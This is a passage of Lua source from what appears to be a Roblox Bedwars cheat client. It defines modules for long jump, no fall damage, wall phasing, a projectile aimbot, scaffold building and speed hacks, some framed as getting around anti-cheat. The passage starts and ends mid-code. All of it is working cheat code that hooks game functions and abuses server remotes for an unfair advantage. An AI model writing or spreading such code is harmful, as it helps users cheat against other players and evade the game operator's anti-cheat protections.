			local pos = Vector3.new(pos2.X, getScaffold(Vector3.new(0, pos2.Y - (((entityLibrary.character.HumanoidRootPart.Size.Y / 2) + entityLibrary.character.Humanoid.HipHeight) - 1.5), 0)).Y, pos2.Z)
			local block = bedwars.placeBlock(pos, "tnt")
		end,
		cannon = function(tnt, pos2)
			task.spawn(function()
				local pos = Vector3.new(pos2.X, getScaffold(Vector3.new(0, pos2.Y - (((entityLibrary.character.HumanoidRootPart.Size.Y / 2) + entityLibrary.character.Humanoid.HipHeight) - 1.5), 0)).Y, pos2.Z)
				local block = bedwars.placeBlock(pos, "cannon")
				task.delay(0.1, function()
					local block, pos2 = getPlacedBlock(pos)
					if block and block.Name == "cannon" and (entityLibrary.character.HumanoidRootPart.CFrame.p - block.Position).Magnitude < 20 then 
						switchToAndUseTool(block)
						local vec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
						local damage = bedwars.BlockController:calculateBlockDamage(lplr, {
							blockPosition = pos2
						})
						bedwars.ClientHandler:Get(bedwars.CannonAimRemote):SendToServer({
							cannonBlockPos = pos2,
							lookVector = vec
						})
						local broken = 0.1
						if damage < block:GetAttribute("Health") then 
							task.spawn(function()
								broken = 0.4
								bedwars.breakBlock(block.Position, true, getBestBreakSide(block.Position), true, true)
							end)
						end
						task.delay(broken, function()
							for i = 1, 3 do 
								local call = bedwars.ClientHandler:Get(bedwars.CannonLaunchRemote):CallServer({cannonBlockPos = bedwars.BlockController:getBlockPosition(block.Position)})
								if call then
									bedwars.breakBlock(block.Position, true, getBestBreakSide(block.Position), true, true)
									task.delay(0.1, function()
										damagetimer = LongJumpSpeed.Value * 5
										damagetimertick = tick() + 2.5
										directionvec = Vector3.new(vec.X, 0, vec.Z).Unit
									end)
									break
								end
								task.wait(0.1)
							end
						end)
					end
				end)	
			end)
		end,
		wood_dao = function(tnt, pos2)
			task.spawn(function()
				switchItem(tnt.tool)
				if not (not lplr.Character:GetAttribute("CanDashNext") or lplr.Character:GetAttribute("CanDashNext") < workspace:GetServerTimeNow()) then
					repeat task.wait() until (not lplr.Character:GetAttribute("CanDashNext") or lplr.Character:GetAttribute("CanDashNext") < workspace:GetServerTimeNow()) or not LongJump.Enabled
				end
				if LongJump.Enabled then
					local vec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
					replicatedStorageService["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].useAbility:FireServer("dash", {
						direction = vec,
						origin = entityLibrary.character.HumanoidRootPart.CFrame.p,
						weapon = tnt.itemType
					})
					damagetimer = LongJumpSpeed.Value * 3.5
					damagetimertick = tick() + 2.5
					directionvec = Vector3.new(vec.X, 0, vec.Z).Unit
				end
			end)
		end,
		jade_hammer = function(tnt, pos2)
			task.spawn(function()
				if not bedwars.AbilityController:canUseAbility("jade_hammer_jump") then
					repeat task.wait() until bedwars.AbilityController:canUseAbility("jade_hammer_jump") or not LongJump.Enabled
					task.wait(0.1)
				end
				if bedwars.AbilityController:canUseAbility("jade_hammer_jump") and LongJump.Enabled then
					bedwars.AbilityController:useAbility("jade_hammer_jump")
					local vec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
					damagetimer = LongJumpSpeed.Value * 2.75
					damagetimertick = tick() + 2.5
					directionvec = Vector3.new(vec.X, 0, vec.Z).Unit
				end
			end)
		end,
		void_axe = function(tnt, pos2)
			task.spawn(function()
				if not bedwars.AbilityController:canUseAbility("void_axe_jump") then
					repeat task.wait() until bedwars.AbilityController:canUseAbility("void_axe_jump") or not LongJump.Enabled
					task.wait(0.1)
				end
				if bedwars.AbilityController:canUseAbility("void_axe_jump") and LongJump.Enabled then
					bedwars.AbilityController:useAbility("void_axe_jump")
					local vec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
					damagetimer = LongJumpSpeed.Value * 2.75
					damagetimertick = tick() + 2.5
					directionvec = Vector3.new(vec.X, 0, vec.Z).Unit
				end
			end)
		end
	}
	damagemethods.stone_dao = damagemethods.wood_dao
	damagemethods.iron_dao = damagemethods.wood_dao
	damagemethods.diamond_dao = damagemethods.wood_dao
	damagemethods.emerald_dao = damagemethods.wood_dao

	local oldgrav
	local LongJumpacprogressbarframe = Instance.new("Frame")
	LongJumpacprogressbarframe.AnchorPoint = Vector2.new(0.5, 0)
	LongJumpacprogressbarframe.Position = UDim2.new(0.5, 0, 1, -200)
	LongJumpacprogressbarframe.Size = UDim2.new(0.2, 0, 0, 20)
	LongJumpacprogressbarframe.BackgroundTransparency = 0.5
	LongJumpacprogressbarframe.BorderSizePixel = 0
	LongJumpacprogressbarframe.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
	LongJumpacprogressbarframe.Visible = LongJump.Enabled
	LongJumpacprogressbarframe.Parent = GuiLibrary.MainGui
	local LongJumpacprogressbarframe2 = LongJumpacprogressbarframe:Clone()
	LongJumpacprogressbarframe2.AnchorPoint = Vector2.new(0, 0)
	LongJumpacprogressbarframe2.Position = UDim2.new(0, 0, 0, 0)
	LongJumpacprogressbarframe2.Size = UDim2.new(1, 0, 0, 20)
	LongJumpacprogressbarframe2.BackgroundTransparency = 0
	LongJumpacprogressbarframe2.Visible = true
	LongJumpacprogressbarframe2.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
	LongJumpacprogressbarframe2.Parent = LongJumpacprogressbarframe
	local LongJumpacprogressbartext = Instance.new("TextLabel")
	LongJumpacprogressbartext.Text = "2.5s"
	LongJumpacprogressbartext.Font = Enum.Font.Gotham
	LongJumpacprogressbartext.TextStrokeTransparency = 0
	LongJumpacprogressbartext.TextColor3 =  Color3.new(0.9, 0.9, 0.9)
	LongJumpacprogressbartext.TextSize = 20
	LongJumpacprogressbartext.Size = UDim2.new(1, 0, 1, 0)
	LongJumpacprogressbartext.BackgroundTransparency = 1
	LongJumpacprogressbartext.Position = UDim2.new(0, 0, -1, 0)
	LongJumpacprogressbartext.Parent = LongJumpacprogressbarframe
	LongJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "LongJump",
		Function = function(callback)
			if callback then
				table.insert(LongJump.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
					if damageTable.entityInstance == lplr.Character and (not damageTable.knockbackMultiplier or not damageTable.knockbackMultiplier.disabled) then 
						local knockbackBoost = damageTable.knockbackMultiplier and damageTable.knockbackMultiplier.horizontal and damageTable.knockbackMultiplier.horizontal * LongJumpSpeed.Value or LongJumpSpeed.Value
						if damagetimertick < tick() or knockbackBoost >= damagetimer then
							damagetimer = knockbackBoost
							damagetimertick = tick() + 2.5
							local newDirection = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
							directionvec = Vector3.new(newDirection.X, 0, newDirection.Z).Unit
						end
					end
				end))
				task.spawn(function()
					task.spawn(function()
						repeat
							task.wait()
							if LongJumpacprogressbarframe then
								LongJumpacprogressbarframe.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
								LongJumpacprogressbarframe2.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
							end
						until (not LongJump.Enabled)
					end)
					local LongJumpOrigin = entityLibrary.isAlive and entityLibrary.character.HumanoidRootPart.Position
					local tntcheck
					for i,v in pairs(damagemethods) do 
						local item = getItem(i)
						if item then
							if i == "tnt" then 
								local pos = getScaffold(LongJumpOrigin)
								tntcheck = Vector3.new(pos.X, LongJumpOrigin.Y, pos.Z)
								v(item, pos)
							else
								v(item, LongJumpOrigin)
							end
							break
						end
					end
					local changecheck
					LongJumpacprogressbarframe.Visible = true
					RunLoops:BindToHeartbeat("LongJump", function(dt)
						if entityLibrary.isAlive then 
							if entityLibrary.character.Humanoid.Health <= 0 then 
								LongJump.ToggleButton(false)
								return
							end
							if not LongJumpOrigin then 
								LongJumpOrigin = entityLibrary.character.HumanoidRootPart.Position
							end
							local newval = damagetimer ~= 0
							if changecheck ~= newval then 
								if newval then 
									LongJumpacprogressbarframe2:TweenSize(UDim2.new(0, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 2.5, true)
								else
									LongJumpacprogressbarframe2:TweenSize(UDim2.new(1, 0, 0, 20), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 0, true)
								end
								changecheck = newval
							end
							if newval then 
								local newnum = math.max(math.floor((damagetimertick - tick()) * 10) / 10, 0)
								if LongJumpacprogressbartext then 
									LongJumpacprogressbartext.Text = newnum.."s"
								end
								if directionvec == nil then 
									directionvec = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
								end
								local longJumpCFrame = Vector3.new(directionvec.X, 0, directionvec.Z)
								local newvelo = longJumpCFrame.Unit == longJumpCFrame.Unit and longJumpCFrame.Unit * (newnum > 1 and damagetimer or 20) or Vector3.zero
								newvelo = Vector3.new(newvelo.X, 0, newvelo.Z)
								longJumpCFrame = longJumpCFrame * (getSpeed() + 3) * dt
								local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, longJumpCFrame, bedwarsStore.blockRaycast)
								if ray then 
									longJumpCFrame = Vector3.zero
									newvelo = Vector3.zero
								end

								entityLibrary.character.HumanoidRootPart.Velocity = newvelo
								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + longJumpCFrame
							else
								LongJumpacprogressbartext.Text = "2.5s"
								entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(LongJumpOrigin, LongJumpOrigin + entityLibrary.character.HumanoidRootPart.CFrame.lookVector)
								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
								if tntcheck then 
									entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(tntcheck + entityLibrary.character.HumanoidRootPart.CFrame.lookVector, tntcheck + (entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 2))
								end
							end
						else
							if LongJumpacprogressbartext then 
								LongJumpacprogressbartext.Text = "2.5s"
							end
							LongJumpOrigin = nil
							tntcheck = nil
						end
					end)
				end)
			else
				LongJumpacprogressbarframe.Visible = false
				RunLoops:UnbindFromHeartbeat("LongJump")
				directionvec = nil
				tntcheck = nil
				LongJumpOrigin = nil
				damagetimer = 0
				damagetimertick = 0
			end
		end, 
		HoverText = "Lets you jump farther (Not landing on same level & Spamming can lead to lagbacks)"
	})
	LongJumpSpeed = LongJump.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 52,
		Function = function() end,
		Default = 52
	})
end)

runFunction(function()
	local NoFall = {Enabled = false}
	local oldfall
	NoFall = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "NoFall",
		Function = function(callback)
			if callback then
				task.spawn(function()
					repeat
						task.wait(0.5)
						bedwars.ClientHandler:Get("GroundHit"):SendToServer()
					until (not NoFall.Enabled)
				end)
			end
		end, 
		HoverText = "Prevents taking fall damage."
	})
end)

runFunction(function()
	local NoSlowdown = {Enabled = false}
	local OldSetSpeedFunc
	NoSlowdown = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "NoSlowdown",
		Function = function(callback)
			if callback then
				OldSetSpeedFunc = bedwars.SprintController.setSpeed
				bedwars.SprintController.setSpeed = function(tab1, val1)
					local hum = entityLibrary.character.Humanoid
					if hum then
						hum.WalkSpeed = math.max(20 * tab1.moveSpeedMultiplier, 20)
					end
				end
				bedwars.SprintController:setSpeed(20)
			else
				bedwars.SprintController.setSpeed = OldSetSpeedFunc
				bedwars.SprintController:setSpeed(20)
				OldSetSpeedFunc = nil
			end
		end, 
		HoverText = "Prevents slowing down when using items."
	})
end)

local spiderActive = false
local holdingshift = false
runFunction(function()
	local activatePhase = false
	local oldActivatePhase = false
	local PhaseDelay = tick()
	local Phase = {Enabled = false}
	local PhaseStudLimit = {Value = 1}
	local PhaseModifiedParts = {}
	local raycastparameters = RaycastParams.new()
	raycastparameters.RespectCanCollide = true
	raycastparameters.FilterType = Enum.RaycastFilterType.Whitelist
	local overlapparams = OverlapParams.new()
	overlapparams.RespectCanCollide = true

	local function isPointInMapOccupied(p)
		overlapparams.FilterDescendantsInstances = {lplr.Character, gameCamera}
		local possible = workspace:GetPartBoundsInBox(CFrame.new(p), Vector3.new(1, 2, 1), overlapparams)
		return (#possible == 0)
	end

	Phase = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "Phase",
		Function = function(callback)
			if callback then
				RunLoops:BindToHeartbeat("Phase", function()
					if entityLibrary.isAlive and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero and (not GuiLibrary.ObjectsThatCanBeSaved.SpiderOptionsButton.Api.Enabled or holdingshift) then
						if PhaseDelay <= tick() then
							raycastparameters.FilterDescendantsInstances = {bedwarsStore.blocks, collectionService:GetTagged("spawn-cage"), workspace.SpectatorPlatform}
							local PhaseRayCheck = workspace:Raycast(entityLibrary.character.Head.CFrame.p, entityLibrary.character.Humanoid.MoveDirection * 1.15, raycastparameters)
							if PhaseRayCheck then
								local PhaseDirection = (PhaseRayCheck.Normal.Z ~= 0 or not PhaseRayCheck.Instance:GetAttribute("GreedyBlock")) and "Z" or "X"
								if PhaseRayCheck.Instance.Size[PhaseDirection] <= PhaseStudLimit.Value * 3 and PhaseRayCheck.Instance.CanCollide and PhaseRayCheck.Normal.Y == 0 then
									local PhaseDestination = entityLibrary.character.HumanoidRootPart.CFrame + (PhaseRayCheck.Normal * (-(PhaseRayCheck.Instance.Size[PhaseDirection]) - (entityLibrary.character.HumanoidRootPart.Size.X / 1.5)))
									if isPointInMapOccupied(PhaseDestination.p) then
										PhaseDelay = tick() + 1
										entityLibrary.character.HumanoidRootPart.CFrame = PhaseDestination
									end
								end
							end
						end
					end
				end)
			else
				RunLoops:UnbindFromHeartbeat("Phase")
			end
		end,
		HoverText = "Lets you Phase/Clip through walls. (Hold shift to use Phase over spider)"
	})
	PhaseStudLimit = Phase.CreateSlider({
		Name = "Blocks",
		Min = 1,
		Max = 3,
		Function = function() end
	})
end)

runFunction(function()
	local oldCalculateAim
	local BowAimbotProjectiles = {Enabled = false}
	local BowAimbotPart = {Value = "HumanoidRootPart"}
	local BowAimbotFOV = {Value = 1000}
	local BowAimbot = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "ProjectileAimbot",
		Function = function(callback)
			if callback then
				oldCalculateAim = bedwars.ProjectileController.calculateImportantLaunchValues
				bedwars.ProjectileController.calculateImportantLaunchValues = function(self, projmeta, worldmeta, shootpospart, ...)
					local plr = EntityNearMouse(BowAimbotFOV.Value)
					if plr then
						local startPos = self:getLaunchPosition(shootpospart)
						if not startPos then
							return oldCalculateAim(self, projmeta, worldmeta, shootpospart, ...)
						end

						if (not BowAimbotProjectiles.Enabled) and projmeta.projectile:find("arrow") == nil then
							return oldCalculateAim(self, projmeta, worldmeta, shootpospart, ...)
						end

						local projmetatab = projmeta:getProjectileMeta()
						local projectilePrediction = (worldmeta and projmetatab.predictionLifetimeSec or projmetatab.lifetimeSec or 3)
						local projectileSpeed = (projmetatab.launchVelocity or 100)
						local gravity = (projmetatab.gravitationalAcceleration or 196.2)
						local projectileGravity = gravity * projmeta.gravityMultiplier
						local offsetStartPos = startPos + projmeta.fromPositionOffset
						local pos = plr.Character[BowAimbotPart.Value].Position
						local playerGravity = workspace.Gravity
						local balloons = plr.Character:GetAttribute("InflatedBalloons")

						if balloons and balloons > 0 then 
							playerGravity = (workspace.Gravity * (1 - ((balloons >= 4 and 1.2 or balloons >= 3 and 1 or 0.975))))
						end

						if plr.Character.PrimaryPart:FindFirstChild("rbxassetid://8200754399") then 
							playerGravity = (workspace.Gravity * 0.3)
						end

						local shootpos, shootvelo = predictGravity(pos, plr.Character.HumanoidRootPart.Velocity, (pos - offsetStartPos).Magnitude / projectileSpeed, plr, playerGravity)
						if projmeta.projectile == "telepearl" then
							shootpos = pos
							shootvelo = Vector3.zero
						end
						
						local newlook = CFrame.new(offsetStartPos, shootpos) * CFrame.new(Vector3.new(-bedwars.BowConstantsTable.RelX, -bedwars.BowConstantsTable.RelY, 0))
						shootpos = newlook.p + (newlook.lookVector * (offsetStartPos - shootpos).magnitude)
						local calculated = LaunchDirection(offsetStartPos, shootpos, projectileSpeed, projectileGravity, false)
						oldmove = plr.Character.Humanoid.MoveDirection
						if calculated then
							return {
								initialVelocity = calculated,
								positionFrom = offsetStartPos,
								deltaT = projectilePrediction,
								gravitationalAcceleration = projectileGravity,
								drawDurationSeconds = 5
							}
						end
					end
					return oldCalculateAim(self, projmeta, worldmeta, shootpospart, ...)
				end
			else
				bedwars.ProjectileController.calculateImportantLaunchValues = oldCalculateAim
			end
		end
	})
	BowAimbotPart = BowAimbot.CreateDropdown({
		Name = "Part",
		List = {"HumanoidRootPart", "Head"},
		Function = function() end
	})
	BowAimbotFOV = BowAimbot.CreateSlider({
		Name = "FOV",
		Function = function() end,
		Min = 1,
		Max = 1000,
		Default = 1000
	})
	BowAimbotProjectiles = BowAimbot.CreateToggle({
		Name = "Other Projectiles",
		Function = function() end,
		Default = true
	})
end)

--until I find a way to make the spam switch item thing not bad I'll just get rid of it, sorry.

local Scaffold = {Enabled = false}
runFunction(function()
	local scaffoldtext = Instance.new("TextLabel")
	scaffoldtext.Font = Enum.Font.SourceSans
	scaffoldtext.TextSize = 20
	scaffoldtext.BackgroundTransparency = 1
	scaffoldtext.TextColor3 = Color3.fromRGB(255, 0, 0)
	scaffoldtext.Size = UDim2.new(0, 0, 0, 0)
	scaffoldtext.Position = UDim2.new(0.5, 0, 0.5, 30)
	scaffoldtext.Text = "0"
	scaffoldtext.Visible = false
	scaffoldtext.Parent = GuiLibrary.MainGui
	local ScaffoldExpand = {Value = 1}
	local ScaffoldDiagonal = {Enabled = false}
	local ScaffoldTower = {Enabled = false}
	local ScaffoldDownwards = {Enabled = false}
	local ScaffoldStopMotion = {Enabled = false}
	local ScaffoldBlockCount = {Enabled = false}
	local ScaffoldHandCheck = {Enabled = false}
	local ScaffoldMouseCheck = {Enabled = false}
	local ScaffoldAnimation = {Enabled = false}
	local scaffoldstopmotionval = false
	local scaffoldposcheck = tick()
	local scaffoldstopmotionpos = Vector3.zero
	local scaffoldposchecklist = {}
	task.spawn(function()
		for x = -3, 3, 3 do 
			for y = -3, 3, 3 do 
				for z = -3, 3, 3 do 
					if Vector3.new(x, y, z) ~= Vector3.new(0, 0, 0) then 
						table.insert(scaffoldposchecklist, Vector3.new(x, y, z)) 
					end 
				end 
			end 
		end
	end)

	local function checkblocks(pos)
		for i,v in pairs(scaffoldposchecklist) do
			if getPlacedBlock(pos + v) then
				return true
			end
		end
		return false
	end

	local function closestpos(block, pos)
		local startpos = block.Position - (block.Size / 2) - Vector3.new(1.5, 1.5, 1.5)
		local endpos = block.Position + (block.Size / 2) + Vector3.new(1.5, 1.5, 1.5)
		local speedCFrame = block.Position + (pos - block.Position)
		return Vector3.new(math.clamp(speedCFrame.X, startpos.X, endpos.X), math.clamp(speedCFrame.Y, startpos.Y, endpos.Y), math.clamp(speedCFrame.Z, startpos.Z, endpos.Z))
	end

	local function getclosesttop(newmag, pos)
		local closest, closestmag = pos, newmag * 3
		if entityLibrary.isAlive then 
			for i,v in pairs(bedwarsStore.blocks) do 
				local close = closestpos(v, pos)
				local mag = (close - pos).magnitude
				if mag <= closestmag then 
					closest = close
					closestmag = mag
				end
			end
		end
		return closest
	end

	local oldspeed
	Scaffold = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "Scaffold",
		Function = function(callback)
			if callback then
				scaffoldtext.Visible = ScaffoldBlockCount.Enabled
				if entityLibrary.isAlive then 
					scaffoldstopmotionpos = entityLibrary.character.HumanoidRootPart.CFrame.p
				end
				task.spawn(function()
					repeat
						task.wait()
						if ScaffoldHandCheck.Enabled then 
							if bedwarsStore.localHand.Type ~= "block" then continue end
						end
						if ScaffoldMouseCheck.Enabled then 
							if not inputService:IsMouseButtonPressed(0) then continue end
						end
						if entityLibrary.isAlive then
							local wool, woolamount = getWool()
							if bedwarsStore.localHand.Type == "block" then
								wool = bedwarsStore.localHand.tool.Name
								woolamount = getItem(bedwarsStore.localHand.tool.Name).amount or 0
							elseif (not wool) then 
								wool, woolamount = getBlock()
							end

							scaffoldtext.Text = (woolamount and tostring(woolamount) or "0")
							scaffoldtext.TextColor3 = woolamount and (woolamount >= 128 and Color3.fromRGB(9, 255, 198) or woolamount >= 64 and Color3.fromRGB(255, 249, 18)) or Color3.fromRGB(255, 0, 0)
							if not wool then continue end

							local towering = ScaffoldTower.Enabled and inputService:IsKeyDown(Enum.KeyCode.Space) and game:GetService("UserInputService"):GetFocusedTextBox() == nil
							if towering then
								if (not scaffoldstopmotionval) and ScaffoldStopMotion.Enabled then
									scaffoldstopmotionval = true
									scaffoldstopmotionpos = entityLibrary.character.HumanoidRootPart.CFrame.p
								end
								entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, 28, entityLibrary.character.HumanoidRootPart.Velocity.Z)
								if ScaffoldStopMotion.Enabled and scaffoldstopmotionval then
									entityLibrary.character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(scaffoldstopmotionpos.X, entityLibrary.character.HumanoidRootPart.CFrame.p.Y, scaffoldstopmotionpos.Z))
								end
							else
								scaffoldstopmotionval = false
							end
							
							for i = 1, ScaffoldExpand.Value do
								local speedCFrame = getScaffold((entityLibrary.character.HumanoidRootPart.Position + ((scaffoldstopmotionval and Vector3.zero or entityLibrary.character.Humanoid.MoveDirection) * (i * 3.5))) + Vector3.new(0, -((entityLibrary.character.HumanoidRootPart.Size.Y / 2) + entityLibrary.character.Humanoid.HipHeight + (inputService:IsKeyDown(Enum.KeyCode.LeftShift) and ScaffoldDownwards.Enabled and 4.5 or 1.5))), 0)
								speedCFrame = Vector3.new(speedCFrame.X, speedCFrame.Y - (towering and 4 or 0), speedCFrame.Z)
								if speedCFrame ~= oldpos then
									if not checkblocks(speedCFrame) then
										local oldspeedCFrame = speedCFrame
										speedCFrame = getScaffold(getclosesttop(20, speedCFrame))
										if getPlacedBlock(speedCFrame) then speedCFrame = oldspeedCFrame end
									end
									if ScaffoldAnimation.Enabled then 
										if not getPlacedBlock(speedCFrame) then
										bedwars.ViewmodelController:playAnimation(bedwars.AnimationType.FP_USE_ITEM)
										end
									end
									task.spawn(bedwars.placeBlock, speedCFrame, wool, ScaffoldAnimation.Enabled)
									if ScaffoldExpand.Value > 1 then 
										task.wait()
									end
									oldpos = speedCFrame
								end
							end
						end
					until (not Scaffold.Enabled)
				end)
			else
				scaffoldtext.Visible = false
				oldpos = Vector3.zero
				oldpos2 = Vector3.zero
			end
		end, 
		HoverText = "Helps you make bridges/scaffold walk."
	})
	ScaffoldExpand = Scaffold.CreateSlider({
		Name = "Expand",
		Min = 1,
		Max = 8,
		Function = function(val) end,
		Default = 1,
		HoverText = "Build range"
	})
	ScaffoldDiagonal = Scaffold.CreateToggle({
		Name = "Diagonal", 
		Function = function(callback) end,
		Default = true
	})
	ScaffoldTower = Scaffold.CreateToggle({
		Name = "Tower", 
		Function = function(callback) 
			if ScaffoldStopMotion.Object then
				ScaffoldTower.Object.ToggleArrow.Visible = callback
				ScaffoldStopMotion.Object.Visible = callback
			end
		end
	})
	ScaffoldMouseCheck = Scaffold.CreateToggle({
		Name = "Require mouse down", 
		Function = function(callback) end,
		HoverText = "Only places when left click is held.",
	})
	ScaffoldDownwards  = Scaffold.CreateToggle({
		Name = "Downwards", 
		Function = function(callback) end,
		HoverText = "Goes down when left shift is held."
	})
	ScaffoldStopMotion = Scaffold.CreateToggle({
		Name = "Stop Motion",
		Function = function() end,
		HoverText = "Stops your movement when going up"
	})
	ScaffoldStopMotion.Object.BackgroundTransparency = 0
	ScaffoldStopMotion.Object.BorderSizePixel = 0
	ScaffoldStopMotion.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	ScaffoldStopMotion.Object.Visible = ScaffoldTower.Enabled
	ScaffoldBlockCount = Scaffold.CreateToggle({
		Name = "Block Count",
		Function = function(callback) 
			if Scaffold.Enabled then
				scaffoldtext.Visible = callback 
			end
		end,
		HoverText = "Shows the amount of blocks in the middle."
	})
	ScaffoldHandCheck = Scaffold.CreateToggle({
		Name = "Whitelist Only",
		Function = function() end,
		HoverText = "Only builds with blocks in your hand."
	})
	ScaffoldAnimation = Scaffold.CreateToggle({
		Name = "Animation",
		Function = function() end
	})
end)

local antivoidvelo
runFunction(function()
	local Speed = {Enabled = false}
	local SpeedMode = {Value = "CFrame"}
	local SpeedValue = {Value = 1}
	local SpeedValueLarge = {Value = 1}
	local SpeedDamageBoost = {Enabled = false}
	local SpeedJump = {Enabled = false}
	local SpeedJumpHeight = {Value = 20}
	local SpeedJumpAlways = {Enabled = false}
	local SpeedJumpSound = {Enabled = false}
	local SpeedJumpVanilla = {Enabled = false}
	local SpeedAnimation = {Enabled = false}
	local raycastparameters = RaycastParams.new()
	local damagetick = tick()

	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}
	Speed = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
		Name = "Speed",
		Function = function(callback)
			if callback then
				table.insert(Speed.Connections, vapeEvents.EntityDamageEvent.Event:Connect(function(damageTable)
					if damageTable.entityInstance == lplr.Character and (damageTable.damageType ~= 0 or damageTable.extra and damageTable.extra.chargeRatio ~= nil) and (not (damageTable.knockbackMultiplier and damageTable.knockbackMultiplier.disabled or damageTable.knockbackMultiplier and damageTable.knockbackMultiplier.horizontal == 0)) and SpeedDamageBoost.Enabled then 
						damagetick = tick() + 0.4
					end
				end))
				RunLoops:BindToHeartbeat("Speed", function(delta)
					if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then
						if bedwarsStore.matchState == 0 then return end
					end
					if entityLibrary.isAlive then
						if not (isnetworkowner(entityLibrary.character.HumanoidRootPart) and entityLibrary.character.Humanoid:GetState() ~= Enum.HumanoidStateType.Climbing and (not spiderActive) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled)) then return end
						if GuiLibrary.ObjectsThatCanBeSaved.GrappleExploitOptionsButton and GuiLibrary.ObjectsThatCanBeSaved.GrappleExploitOptionsButton.Api.Enabled then return end
						if LongJump.Enabled then return end
						if SpeedAnimation.Enabled then
							for i, v in pairs(entityLibrary.character.Humanoid:GetPlayingAnimationTracks()) do
								if v.Name == "WalkAnim" or v.Name == "RunAnim" then
									v:AdjustSpeed(entityLibrary.character.Humanoid.WalkSpeed / 16)
								end
							end
						end

						local speedValue = SpeedValue.Value + getSpeed()
						if damagetick > tick() then speedValue = speedValue + 20 end

						local speedVelocity = entityLibrary.character.Humanoid.MoveDirection * (SpeedMode.Value == "Normal" and SpeedValue.Value or 20)
						entityLibrary.character.HumanoidRootPart.Velocity = antivoidvelo or Vector3.new(speedVelocity.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, speedVelocity.Z)
						if SpeedMode.Value ~= "Normal" then 
							local speedCFrame = entityLibrary.character.Humanoid.MoveDirection * (speedValue - 20) * delta
							raycastparameters.FilterDescendantsInstances = {lplr.Character}
							local ray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, speedCFrame, raycastparameters)
							if ray then speedCFrame = (ray.Position - entityLibrary.character.HumanoidRootPart.Position) end
							entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + speedCFrame
						end

						if SpeedJump.Enabled and (not Scaffold.Enabled) and (SpeedJumpAlways.Enabled or killauraNearPlayer) then
							if (entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air) and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero then
								if SpeedJumpSound.Enabled then 
									pcall(function() entityLibrary.character.HumanoidRootPart.Jumping:Play() end)
								end
								if SpeedJumpVanilla.Enabled then 
									entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
								else
									entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, SpeedJumpHeight.Value, entityLibrary.character.HumanoidRootPart.Velocity.Z)
								end
							end 
						end
					end
				end)
			else
				RunLoops:UnbindFromHeartbeat("Speed")
			end
		end, 
		HoverText = "Increases your movement.",
		ExtraText = function() 
			return "Heatseeker"
		end
	})
	SpeedValue = Speed.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 23,
		Function = function(val) end,
		Default = 23
	})
	SpeedValueLarge = Speed.CreateSlider({
		Name = "Big Mode Speed",
		Min = 1,
		Max = 23,
		Function = function(val) end,
		Default = 23
	})
	SpeedDamageBoost = Speed.CreateToggle({
